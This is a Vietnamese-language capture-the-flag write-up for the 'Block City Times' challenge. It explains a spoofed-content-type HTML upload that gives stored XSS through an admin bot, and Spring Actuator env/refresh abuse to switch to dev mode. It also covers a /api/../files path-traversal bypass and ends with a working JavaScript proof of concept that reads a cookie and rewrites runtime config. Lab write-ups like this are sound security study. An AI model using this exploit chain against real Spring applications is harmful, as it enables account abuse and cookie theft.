---
title: "The Block City Times"
slug: "umassctf-2026-the-block-city-times"
platform: "UMassCTF 2026"
difficulty: "Medium"
vulnerabilities: ["Cross-Site Scripting","Security Misconfiguration"]
publishedAt: "2026-09-14"
summary: "Phân tích chức năng gửi bài, bot biên tập và cấu hình runtime của ứng dụng báo điện tử."
draft: false
sortOrder: 9
---
## Overview
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Đây là một challenge gồm 3 thành phần chính:
    - **app**: là máy chủ Spring Boot xử lý chức năng chính  cho xem báo và nhận file upload
    - **editorial**: là bộ phần để duyệt bài viết và sẽ tự đăng nhập admin và mở file của ng dùng up
    - **report-runner**: là bot báo cáo lỗi và giữ flag trong cookie nhưng chỉ kích hoạt khi endpoint **/admin/repot** được bật
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mục tiêu là lợi dụng file upload đưuoc thiết lập sai từ đó khai thác XSS và cấu hình Actuator để chuyển chế độ dev -> bật report-runner và lấy flag.
## Vulnerability and Exploit
### 1. Admin-XSS
```text=
app
├── /login               [GET/POST] -> SecurityConfig + login.html
├── /submit              [GET] -> StoryController.submitForm()
├── /submit              [POST] -> StoryController.submitStory()
├── /files/{filename}    [GET] -> StoryController.serveFile()
│
├── /api
│   └── /config          [GET] -> ConfigController (admin)
│
└── /admin
    └── /report          [POST] -> ReportController.reportError()
```
Ta xem qua các file code sau:
**docker-compose.yml**
![Screenshot 2026-04-14 203614](https://hackmd.io/_uploads/Skg_Kas2Ze.png)
**SecurityConfig.java**
![Screenshot 2026-04-14 211618](https://hackmd.io/_uploads/rk0C3aihWl.png)
**editorial/sever.js**
![Screenshot 2026-04-14 205908](https://hackmd.io/_uploads/S1h_Fpj2Wl.png)
**StoryController.java**
hoi dai nen viet tung doan
```java=
String contentType = file.getContentType();
if (contentType == null || !outboundProps.getAllowedTypes().contains(contentType)) {
    model.addAttribute("error",
        "File type '" + contentType + "' is not accepted. " +
        "Please submit a plain text or PDF document.");
    return "submit";
}
String safe = file.getOriginalFilename().replaceAll("[^a-zA-Z0-9._-]", "_");
String filename = UUID.randomUUID() + "-" + safe;
Files.write(uploadDir.resolve(filename), file.getBytes());
```
quyết định file có hợp lệ k nhưng dùng **file.getContentType** nên client có thể giả mạo và phần lưu file chỉ thay kí tự lạ nên nếu gửi .html và giả mạo trong client thì sẽ qua được
![image](https://hackmd.io/_uploads/rkgCgAshZe.png)
app k trả file an toàn mà trả file với **.contentType(MediaType.parseMediaType(contentType))**
nhưng khi render lại nhìn vào duôi file **Files.probeContentType(filePath)** nên có thể chạy được .html 

=>>> có một lỗ hổng xuất phát ở đây.Máy chủ kiểm tra dựa trên content-type mà client gửi lên trong request thay vì nội dung thật. vì vậy có thể ngụy tạo một file html thành một whitelist để tải lên thành công và nếu truy cập được qua **/file/{filename}** và nó sẽ chạy html và thực thi js và đặc biệt nếu là bot có admin như ở trên đã nói hay có gắn sẵn cookie thì sẽ thành stored XSS
![image](https://hackmd.io/_uploads/SJKD0A32-e.png)
![image](https://hackmd.io/_uploads/Bkvj0C2h-l.png)
bot đã đăng nhập admin thành công và mở file do mình upload -> js chạy nên có thêm một request đến /api/config cái mà chỉ has role only mới vào được
### 2. Bật dev mode
![image](https://hackmd.io/_uploads/B1-V5l63be.png)
Trong file **application.yml** ta có thể thấy app có 2 config một là **dev** hai là **prod** và mặc định sẽ là **prod**, ta có thể xác nhận lại bằng câu chào 
![image](https://hackmd.io/_uploads/SJJCqea2bx.png)
Đọc thêm file **reportcontroller.java** file này có tác dụng gọi ra service **report-runner** như lúc đầu ta đã đề cập. Tuy nhiên:
![image](https://hackmd.io/_uploads/r1e1Rxa3-g.png)
Tức là route **/admin/report** chỉ được dev dùng còn prod thì nó khóa. Mà ta đã thấy rõ hint là cái **report-runner** được gắn flag
![image](https://hackmd.io/_uploads/B10w0xp3-l.png)
Tức là hiển nhiên ý tưởng của ta là giờ làm sao để đổi được config để có thể đổi từ **prod** -> **dev**  và vào được **report-runner**
Hiện ta đã có admin-XSS tức gửi request như admin nên nhìn ngay vào các route và thấy một cái khá giống mình cần **/admin/switch**
![image](https://hackmd.io/_uploads/SkaPBZ6n-l.png)
tuy nhiên xuất hiện đoạn check sau mà trong **AppProperties** ta có 
![image](https://hackmd.io/_uploads/ByBq9WTnWe.png)
Vì enforceProduction đang bật nên kể cả có session admin thì vẫn bị khóa k đổi được config.
Ta quay lại security config thì thấy bị chặn các route **/actuator** khi không có admin nhưng giờ ta có rồi và đoạn này 
![image](https://hackmd.io/_uploads/Bkw3s-p3Ze.png)
tức ta có các enpoint trên và bật POST cho endpoint env mà ở đây là spring environment. spring thì lại lấy config từ nhiều nguồn trong đó có cái này nên khi bật cái này ta nghĩ ngay đến việc ghi đè property runtime
ta test bằng payload dưới đây
![image](https://hackmd.io/_uploads/HJa9RZ63Zg.png)
dùng fetch đến **/actuator/env** để đổi config sang dev và một lần **/refresh** để áp dụng config mới và có thể thấy nó đã chạy thành công trong dev mode
### 3. Lấy flag
giờ ta có **/admin/report** có thể vào được và có cookie là flag vì vậy nếu mình nhờ nó mở html độc của mình và in document.cookie ra body là ăn
Tuy nhiên
![image](https://hackmd.io/_uploads/BJ_P-QT2Zx.png)
nó k chấp nhận path tùy ý và chỉ cho endpoit bắt đầu bằng **/api** tuy nhiên nó chỉ check phần đầu nên mình rất đơn giản path traversal kiểu **/api/../files/...**
=>>>>> Vật thì chain cuối là mượn  edit bot để lấy CSRF  gọi /admin/report với /api/../file/test.html.  lần 2 report-runner mở lại test.html lúc này có flag dùng cơ chế actuator như ở trên để thay cái greeting = flag -> refresh sau đó lấy flag ở ticker-inner
POC:
```html=
<!doctype html>
<html>
<body>
<script>
(async () => {
  const name = decodeURIComponent(location.pathname.split('/').pop());

  const m = document.cookie.match(/(?:^|;\s*)FLAG=([^;]+)/);
  if (m) {
    const flag = decodeURIComponent(m[1]);

    await fetch('/actuator/env', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'app.configs.dev.greeting',
        value: flag
      })
    }).catch(() => {});

    await fetch('/actuator/refresh', {
      method: 'POST',
      credentials: 'include'
    }).catch(() => {});

    document.body.innerText = flag;
    return;
  }

  const html = await fetch('/login', {
    credentials: 'include'
  }).then(r => r.text());

  const csrf = (html.match(/name="_csrf"\s+value="([^"]+)"/) || [])[1];
  if (!csrf) {
    document.body.innerText = 'no csrf';
    return;
  }

  const body = new URLSearchParams();
  body.set('_csrf', csrf);
  body.set('endpoint', '/api/../files/' + encodeURIComponent(name));

  await fetch('/admin/report', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString()
  });

  document.body.innerText = 'queued';
})();
</script>
</body>
</html>
```
Flag
![image](https://hackmd.io/_uploads/r16BVEpnZe.png)
